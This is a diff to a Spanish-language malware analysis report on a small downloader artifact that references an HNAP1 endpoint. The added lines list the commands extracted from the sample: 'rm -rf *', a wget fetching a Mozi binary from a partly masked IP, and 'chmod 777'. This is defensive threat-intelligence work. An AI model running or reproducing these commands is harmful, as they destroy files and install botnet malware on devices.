@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 796 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `HNAP1` en `hxxp://purenetworks[.]com/HNAP1/`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 796 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `HNAP1` en `hxxp://purenetworks[.]com/HNAP1/`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `rm -rf *`
+2. `wget hxxp://172.168.176.XXX:47500/Mozi.m`
+3. `chmod 777` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0.md](../../../../../malware-like/oraculo/downloader/a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0.md)
 
 
 ## 🏷️ Clasificación
